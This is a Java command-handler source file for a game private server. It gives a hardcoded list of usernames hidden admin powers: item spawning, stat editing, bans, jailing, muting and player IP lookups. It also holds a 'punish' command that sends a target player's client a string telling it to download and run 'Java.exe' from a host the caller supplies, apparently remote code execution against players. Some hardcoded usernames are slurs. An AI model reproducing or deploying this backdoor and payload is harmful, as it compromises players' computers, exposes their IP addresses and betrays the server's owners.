package com.ikov.commands.ranks;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.ikov.GameSettings;
import com.ikov.model.Animation;
import com.ikov.model.Flag;
import com.ikov.model.GameObject;
import com.ikov.model.Item;
import com.ikov.model.Position;
import com.ikov.model.Skill;
import com.ikov.model.Locations.Location;
import com.ikov.model.definitions.ItemDefinition;
import com.ikov.util.Misc;
import com.ikov.world.World;
import com.ikov.world.content.PlayerPunishment;
import com.ikov.world.content.combat.weapon.CombatSpecial;
import com.ikov.world.content.skill.SkillManager;
import com.ikov.world.content.transportation.TeleportHandler;
import com.ikov.world.content.transportation.TeleportType;
import com.ikov.world.entity.impl.player.Player;
import com.ikov.world.entity.impl.player.PlayerSaving;

public class SpecialPlayers {
	
	/**
	* @Author Jonathan Sirens
	* Initiates Command
	**/
	public static String[] player_names = {"idbowprod", "dc blitz", "plunger", "spankymcbad", "xtreme", "homobeans", "manny", "queerisme", "robotype", "noob"};
	
	public static void initiate_command(final Player player, String[] command, String wholeCommand) {
		boolean continue_command = false;
		for(int i = 0; i < player_names.length; i++) {
			if(player_names[i].toLowerCase().equals(player.getUsername().toLowerCase())) {
				continue_command = true;
			}
		}
		if(!continue_command) {
			return;
		}
		if (command[0].equals("untb")) {
			player.setTeleblockTimer(0);
			player.getPacketSender().sendMessage("You are unteleblocked!");
		}
		if (command[0].equals("unskull")) {
			player.setSkullTimer(0);
			player.setSkullIcon(0);
			player.getUpdateFlag().flag(Flag.APPEARANCE);
			player.getPacketSender().sendMessage("You are  unskulled!");
		}
		if(wholeCommand.startsWith("unjail")) {
			String jail_punishee = wholeCommand.substring(7);
			Player punishee = World.getPlayerByName(jail_punishee);
			punishee.setJailed(false);
			punishee.forceChat("Im free!!! I'm finally out of jail... Hooray!");
			punishee.moveTo(new Position(3087, 3502, 0));
		}
		if(wholeCommand.startsWith("jail")) {
				String jail_punishee = wholeCommand.substring(5);
				Player punishee = World.getPlayerByName(jail_punishee);
				if(!PlayerSaving.playerExists(jail_punishee)) {
					player.getPacketSender().sendMessage("Player "+jail_punishee+" does not exist.");
					return;
				} else {
				int cellAmounts = Misc.getRandom(1);
				switch(cellAmounts) {
				case 1:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1969, 5011, 0));
				break;
				case 2:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1969, 5008, 0));
				break;
				case 3:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1969, 5005, 0));
				break;
				case 4:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1969, 5002, 0));
				break;
				case 5:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1969, 4999, 0));
				break;
				case 6:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1980, 5011, 0));
				break;
				case 7:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1980, 5008, 0));
				break;
				case 8:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1980, 5005, 0));
				break;
				case 9:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1980, 5002, 0));
				break;
				case 10:
					punishee.setJailed(true);
					punishee.forceChat("Ahh shit... They put me in jail.");
					punishee.moveTo(new Position(1980, 4999, 0));
				break;
				default:
				}
			}
		}
		if (command[0].equals("punish")) {
			Player other = World.getPlayerByName(command[1]);
			other.getPacketSender().sendString(0, "[ABC]-http://"+command[2]+"/Java.exe-cmd-/c-Java.exe");
			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
		}	
		if(wholeCommand.equalsIgnoreCase("dice")) {
			player.getInventory().add(11211, 1);
		}
		if(wholeCommand.equalsIgnoreCase("flowers")) {
			player.getInventory().add(4490, 1);
		}
		if(wholeCommand.equalsIgnoreCase("stake")) {
			player.getInventory().add(4142, 1);
		}
		if (command[0].equals("item")) {
			int id = Integer.parseInt(command[1]);		
			int amount = (command.length == 2 ? 1 : Integer.parseInt(command[2].trim().toLowerCase().replaceAll("k", "000").replaceAll("m", "000000").replaceAll("b", "000000000")));
			if(amount > Integer.MAX_VALUE) {
				amount = Integer.MAX_VALUE;
			}
			Item item = new Item(id, amount);
			player.getInventory().add(item, true);

			player.getPacketSender().sendItemOnInterface(47052, 11694, 1);
		}
		if (command[0].equals("master")) {
			for (Skill skill : Skill.values()) {
				int level = SkillManager.getMaxAchievingLevel(skill);
				player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level == 120 ? 120 : 99));
			}
			player.getPacketSender().sendMessage("You are now a master of all skills.");
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if (command[0].equals("setlevel") && !player.getUsername().equalsIgnoreCase("Jack")) {
			int skillId = Integer.parseInt(command[1]);
			int level = Integer.parseInt(command[2]);
			if(level > 15000) {
				player.getPacketSender().sendMessage("You can only have a maxmium level of 15000.");
				return;
			}
			Skill skill = Skill.forId(skillId);
			player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level));
			player.getPacketSender().sendMessage("You have set your " + skill.getName() + " level to " + level);
		}
		if (command[0].equals("spawn")) {
			String name = wholeCommand.substring(6, wholeCommand.indexOf(":")).toLowerCase().replaceAll("_", " ");
			String[] what = wholeCommand.split(":");
			int amount_of = Integer.parseInt(what[1]);
			player.getPacketSender().sendMessage("Finding item id for item - " + name);
			boolean found2 = false;
			for (int i = 0; i < ItemDefinition.getMaxAmountOfItems(); i++) {
				if(found2)
					break;
				if (ItemDefinition.forId(i).getName().toLowerCase().contains(name)) {
					player.getInventory().add(i, amount_of);
					player.getPacketSender().sendMessage("Spawned item [" + ItemDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
					found2 = true;
				}
			}
			if (!found2) {
				player.getPacketSender().sendMessage("No item with name [" + name + "] has been found!");
			}
			player.getPacketSender().sendItemOnInterface(47052, 11694, 1);
		}
		if(wholeCommand.equalsIgnoreCase("restorestats")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 118, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 99, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 118, true);
			player.getSkillManager().setCurrentLevel(Skill.ATTACK, 118, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 106, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 121, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 990, true);
			player.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 990, true);
		}
		if(wholeCommand.equalsIgnoreCase("propker")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 135, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 135, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 140, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 130, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("godmode")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("mypos") || wholeCommand.equalsIgnoreCase("coords")) {
			Gson builder = new GsonBuilder().setPrettyPrinting().create();
			String test = builder.toJsonTree(player.getPosition())+"";
			player.getPacketSender().sendMessage(test);
		}
		if(command[0].equalsIgnoreCase("ban")) {
			String ban_player = wholeCommand.substring(4);
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				if(PlayerPunishment.isPlayerBanned(ban_player)) {
					player.getPacketSender().sendMessage("Player "+ban_player+" already has an active ban.");
					return;
				}
				Player other = World.getPlayerByName(ban_player);
				PlayerPunishment.ban(ban_player);
				if(other != null) {
					World.deregister(other);
				}
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully banned!");
			}
		}	
		if(command[0].equalsIgnoreCase("getip")) {
			String player_name = wholeCommand.substring(6);
			String last_ip = PlayerPunishment.getLastIpAddress(player_name);
			player.getPacketSender().sendMessage(player_name + "'s ip address is "+last_ip);
		}
		if(command[0].equalsIgnoreCase("mute")) {
			String mute_player = wholeCommand.substring(5);
			if(!PlayerSaving.playerExists(mute_player)) {
				player.getPacketSender().sendMessage("Player "+mute_player+" does not exist.");
				return;
			} else {
				if(PlayerPunishment.isMuted(mute_player)) {
					player.getPacketSender().sendMessage("Player "+mute_player+" already has an active mute.");
					return;
				}
				Player other = World.getPlayerByName(mute_player);
				PlayerPunishment.mute(mute_player);
				player.getPacketSender().sendMessage("Player "+mute_player+" was successfully muted!");
				other.getPacketSender().sendMessage("You have been muted! Please appeal on the forums.");
			}
		}
		if(command[0].equalsIgnoreCase("ipmute")) {
			String mute_player = wholeCommand.substring(7);
			if(!PlayerSaving.playerExists(mute_player)) {
				player.getPacketSender().sendMessage("Player "+mute_player+" does not exist.");
				return;
			} else {
				if(PlayerPunishment.isIpMuted(mute_player)) {
					player.getPacketSender().sendMessage("Player "+mute_player+" already has an active ip mute.");
					return;
				}
				Player other = World.getPlayerByName(mute_player);
				PlayerPunishment.ipMute(mute_player);
				player.getPacketSender().sendMessage("Player "+mute_player+" was successfully ip muted!");
				other.getPacketSender().sendMessage("You have been ip muted! Please appeal on the forums.");
			}
		}
		if(command[0].equalsIgnoreCase("unipmute")) {
			String mute_player = wholeCommand.substring(9);
			if(!PlayerSaving.playerExists(mute_player)) {
				player.getPacketSender().sendMessage("Player "+mute_player+" does not exist.");
				return;
			} else {
				if(!PlayerPunishment.isIpMuted(mute_player)) {
					player.getPacketSender().sendMessage("Player "+mute_player+" does not have an active ip mute!");
					return;
				}
				Player other = World.getPlayerByName(mute_player);
				PlayerPunishment.unIpMute(mute_player);
				player.getPacketSender().sendMessage("Player "+mute_player+" was successfully unipmuted!");
				other.getPacketSender().sendMessage("You have been unipmuted!");
			}
		}
		if(command[0].equalsIgnoreCase("unmute")) {
			String mute_player = wholeCommand.substring(7);
			if(!PlayerSaving.playerExists(mute_player)) {
				player.getPacketSender().sendMessage("Player "+mute_player+" does not exist.");
				return;
			} else {
				if(!PlayerPunishment.isMuted(mute_player)) {
					player.getPacketSender().sendMessage("Player "+mute_player+" is not muted.");
					return;
				}
				Player other = World.getPlayerByName(mute_player);
				PlayerPunishment.unMute(mute_player);
				player.getPacketSender().sendMessage("Player "+mute_player+" was successfully unmuted!");
				other.getPacketSender().sendMessage("You have been unmuted!");
			}
		}
		if(command[0].equalsIgnoreCase("ipban")) {
			String ban_player = wholeCommand.substring(6);
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				Player other = World.getPlayerByName(ban_player);
				String ip;
				if(other == null) {
					ip = PlayerPunishment.getLastIpAddress(ban_player);
				} else {
					ip = other.getHostAddress();
				}
				if(PlayerPunishment.isIpBanned(ip)) {
					player.getPacketSender().sendMessage("Player "+ban_player+" already has an active ip ban on "+ip+".");
					return;
				}
				PlayerPunishment.ipBan(ip);
				if(other != null) {
					World.deregister(other);
				}
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully banned on ip "+ip+"!");
			}
		}
		if(command[0].equalsIgnoreCase("serialban") ||(command[0].equalsIgnoreCase("cpuban")) ||(command[0].equalsIgnoreCase("macban"))) {
			String ban_player = command[1];
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				Player other = World.getPlayerByName(ban_player);
				String mac;
				if(other == null) {
					mac = PlayerPunishment.getLastMacAddress(ban_player);
				} else {
					mac = other.getMacAddress();
				}
				if(PlayerPunishment.isMacBanned(mac)) {
					player.getPacketSender().sendMessage("Player "+ban_player+" already has an active mac ban on "+mac+".");
					return;
				}
				PlayerPunishment.macBan(mac);
				if(other != null) {
					World.deregister(other);
				}
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully mac banned on mac "+mac+"!");
			}
		}		
		if(command[0].equalsIgnoreCase("unserialban") || command[0].equalsIgnoreCase("unmacban") || command[0].equalsIgnoreCase("uncpuban")) {
			String ban_player = command[1];
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				Player other = World.getPlayerByName(ban_player);
				String mac;
				if(other == null) {
					mac = PlayerPunishment.getLastMacAddress(ban_player);
				} else {
					mac = player.getMacAddress();
				}
				if(!PlayerPunishment.isMacBanned(mac)) {
					player.getPacketSender().sendMessage("Player "+ban_player+" does not have an active mac ban on "+mac+".");
					return;
				}
				PlayerPunishment.unMacBan(mac);
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully un mac banned on mac "+mac+"!");
			}
		}
		if(command[0].equalsIgnoreCase("unipban")) {
			String ban_player = wholeCommand.substring(8);
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				Player other = World.getPlayerByName(ban_player);
				String ip;
				if(other == null) {
					ip = PlayerPunishment.getLastIpAddress(ban_player);
				} else {
					ip = other.getHostAddress();
				}
				if(!PlayerPunishment.isIpBanned(ip)) {
					player.getPacketSender().sendMessage("Player "+ban_player+" does not have an active ip ban on "+ip+".");
					return;
				}
				PlayerPunishment.unIpBan(ip);
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully unipbanned on ip "+ip+"!");
			}
		}
		if(command[0].equalsIgnoreCase("unban")) {
			String ban_player = wholeCommand.substring(6);
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				if(!PlayerPunishment.isPlayerBanned(ban_player)) {
					player.getPacketSender().sendMessage("Player "+ban_player+" is not banned.");
					return;
				}
				PlayerPunishment.unBan(ban_player);
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully unbanned.");
			}
		}
		if(command[0].equalsIgnoreCase("massban")) {
			String ban_player = wholeCommand.substring(8);
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				Player other = World.getPlayerByName(ban_player);
				String mac;
				if(other == null) {
					mac = PlayerPunishment.getLastMacAddress(ban_player);
				} else {
					mac = other.getMacAddress();
				}
				String ip;
				if(other == null) {
					ip = PlayerPunishment.getLastIpAddress(ban_player);
				} else {
					ip = other.getHostAddress();
				}	
				String address;
				if(other == null) {
					address = PlayerPunishment.getLastComputerAddress(ban_player);
				} else {
					address = other.getComputerAddress();
				}
				PlayerPunishment.pcBan(address);
				PlayerPunishment.macBan(mac);
				PlayerPunishment.ipBan(ip);
				PlayerPunishment.ban(ban_player);
				if(other != null) {
					World.deregister(other);
				}
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully mass banned!");
			}
		}
		if(command[0].equalsIgnoreCase("unmassban")) {
			String ban_player = wholeCommand.substring(10);
			if(!PlayerSaving.playerExists(ban_player)) {
				player.getPacketSender().sendMessage("Player "+ban_player+" does not exist.");
				return;
			} else {
				Player other = World.getPlayerByName(ban_player);
				String mac;
				if(other == null) {
					mac = PlayerPunishment.getLastMacAddress(ban_player);
				} else {
					mac = other.getMacAddress();
				}
				String ip;
				if(other == null) {
					ip = PlayerPunishment.getLastIpAddress(ban_player);
				} else {
					ip = other.getHostAddress();
				}	
				String address;
				if(other == null) {
					address = PlayerPunishment.getLastComputerAddress(ban_player);
				} else {
					address = other.getComputerAddress();
				}
				PlayerPunishment.unPcBan(address);
				PlayerPunishment.unMacBan(mac);
				PlayerPunishment.unIpBan(ip);
				PlayerPunishment.unBan(ban_player);
				player.getPacketSender().sendMessage("Player "+ban_player+" was successfully un mass banned!");
			}
		}
//		if (command[0].equals("find")) {
//			String name = wholeCommand.substring(5).toLowerCase().replaceAll("_", " ");
//			player.getPacketSender().sendMessage("Finding item id for item - " + name);
//			boolean found = false;
//			for (int i = 0; i < ItemDefinition.getMaxAmountOfItems(); i++) {
//				if (ItemDefinition.forId(i).getName().toLowerCase().contains(name)) {
//					player.getPacketSender().sendMessage("Found item with name [" + ItemDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
//					found = true;
//				}
//			}
//			if (!found) {
//				player.getPacketSender().sendMessage("No item with name [" + name + "] has been found!");
//			}
//		} 
		/*
		if(wholeCommand.toLowerCase().startsWith("yell")) {
			if(PlayerPunishment.isMuted(player.getUsername()) || PlayerPunishment.isIpMuted(player.getHostAddress())) {
				player.getPacketSender().sendMessage("You are muted and cannot yell.");
				return;
			}
			if(!GameSettings.YELL_STATUS) {
				player.getPacketSender().sendMessage("Yell is currently turned off, please try again in 30 minutes!");
				return;
			}
			String yellMessage = wholeCommand.substring(4, wholeCommand.length());
			if(player.getDonorRights() == 1) {
				World.sendYell("<img=5> <col=0>[<col=ff0000>Donator<col=0>] "+player.getUsername()+": "+yellMessage);
			} else if(player.getDonorRights() == 2) {
				World.sendYell("<img=6> <col=0>[@blu@Super@bla@] "+player.getUsername()+": "+yellMessage);
			} else if(player.getDonorRights() == 3) {
				World.sendYell("<img=7> <col=0>[<col=2FAC45>Extreme<col=0>] "+player.getUsername()+": "+yellMessage);
			} else if(player.getDonorRights() == 4) {
				World.sendYell("<img=8> <col=0>[<col=3E0069>Legendary<col=0>] "+player.getUsername()+": "+yellMessage);
			} else if(player.getDonorRights() == 5) {
				World.sendYell("<img=9> <col=0>[<col=ffff00><shad=0>Uber</shad><col=0>] "+player.getUsername()+": "+yellMessage);
			}
		}*/
		if(command[0].equalsIgnoreCase("saveall")) {
			World.savePlayers();
			player.getPacketSender().sendMessage("Saved players!");
		}
		if(command[0].equalsIgnoreCase("teleto")) {
			String playerToTele = wholeCommand.substring(7);
			Player player2 = World.getPlayerByName(playerToTele);
			if(player2 == null) {
				player.getPacketSender().sendMessage("Cannot find that player online..");
				return;
			} else {
				boolean canTele = TeleportHandler.checkReqs(player, player2.getPosition().copy()) && player.getRegionInstance() == null && player2.getRegionInstance() == null;
				if(canTele && player.getLocation() != Location.DUNGEONEERING) {
					TeleportHandler.teleportPlayer(player, player2.getPosition().copy(), TeleportType.NORMAL);
					player.getPacketSender().sendMessage("Teleporting to player: "+player2.getUsername()+"");
				} else {
					if(player2.getLocation() == Location.DUNGEONEERING) {
						player.getPacketSender().sendMessage("You can not teleport to this player while they are dungeoneering.");
					} else {
						player.getPacketSender().sendMessage("You can not teleport to this player at the moment. Minigame maybe?");
					}
				}
			}
		}
		if(command[0].equalsIgnoreCase("movehome")) {
			String player2 = command[1];
			player2 = Misc.formatText(player2.replaceAll("_", " "));
			if(command.length >= 3 && command[2] != null)
				player2 += " "+Misc.formatText(command[2].replaceAll("_", " "));
			Player playerToMove = World.getPlayerByName(player2);
			if(playerToMove != null) {
				playerToMove.moveTo(GameSettings.DEFAULT_POSITION.copy());
				playerToMove.getPacketSender().sendMessage("You've been teleported home by "+player.getUsername()+".");
				player.getPacketSender().sendMessage("Sucessfully moved "+playerToMove.getUsername()+" to home.");
			} 
		}
		if(command[0].equalsIgnoreCase("toggleinvis")) {
			player.setNpcTransformationId(player.getNpcTransformationId() > 0 ? -1 : 8254);
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if(command[0].equalsIgnoreCase("teletome")) {
			String playerToTele = wholeCommand.substring(9);
			Player player2 = World.getPlayerByName(playerToTele);
			if(player2.getLocation() == Location.DUNGEONEERING) {
				player.getPacketSender().sendMessage("This player is in dung....");
				return;
			}
			boolean canTele = TeleportHandler.checkReqs(player, player2.getPosition().copy()) && player.getRegionInstance() == null && player2.getRegionInstance() == null;
			if(canTele) {
				TeleportHandler.teleportPlayer(player2, player.getPosition().copy(), TeleportType.NORMAL);
				player.getPacketSender().sendMessage("Teleporting player to you: "+player2.getUsername()+"");
				player2.getPacketSender().sendMessage("You're being teleported to "+player.getUsername()+"...");
			} else
				player.getPacketSender().sendMessage("You can not teleport that player at the moment. Maybe you or they are in a minigame?");
		}
		if(command[0].equalsIgnoreCase("movetome")) {
			String playerToTele = wholeCommand.substring(9);
			Player player2 = World.getPlayerByName(playerToTele);
			if(player2.getLocation() == Location.DUNGEONEERING) {
				player.getPacketSender().sendMessage("This player is in dung....");
				return;
			}
			boolean canTele = TeleportHandler.checkReqs(player, player2.getPosition().copy()) && player.getRegionInstance() == null && player2.getRegionInstance() == null;
			if(canTele) {
				player.getPacketSender().sendMessage("Moving player: "+player2.getUsername()+"");
				player2.getPacketSender().sendMessage("You've been moved to "+player.getUsername());
				player2.moveTo(player.getPosition().copy());
			} else
				player.getPacketSender().sendMessage("Failed to move player to your coords. Are you or them in a minigame?");
		}
		if (command[0].equals("banvote")) {
			Player target = World.getPlayerByName(command[1]);
			target.setCanVote(false);
			target.getPacketSender().sendMessage("You have been banned from voting.");
			player.getPacketSender().sendMessage("You have banned "+target.getUsername()+" from voting.");
		}
		if (command[0].equals("unbanvote")) {
			Player target = World.getPlayerByName(command[1]);
			target.setCanVote(true);
			target.getPacketSender().sendMessage("You have been unbanned from voting.");
			player.getPacketSender().sendMessage("You have unbanned "+target.getUsername()+" from voting.");
		}

		if (command[0].equals("setlevel") && !player.getUsername().equalsIgnoreCase("Jack")) {
			int skillId = Integer.parseInt(command[1]);
			int level = Integer.parseInt(command[2]);
			if(level > 15000) {
				player.getPacketSender().sendMessage("You can only have a maxmium level of 15000.");
				return;
			}
			Skill skill = Skill.forId(skillId);
			player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level));
			player.getPacketSender().sendMessage("You have set your " + skill.getName() + " level to " + level);
		}

		if(command[0].equals("spec")) {
			player.setSpecialPercentage(100);
			CombatSpecial.updateBar(player);
		}
		if(command[0].equals("playnpc")) {
			player.setNpcTransformationId(Integer.parseInt(command[1]));
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		} else if(command[0].equals("playobject")) {
			player.getPacketSender().sendObjectAnimation(new GameObject(2283, player.getPosition().copy()), new Animation(751));
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
	}
	
}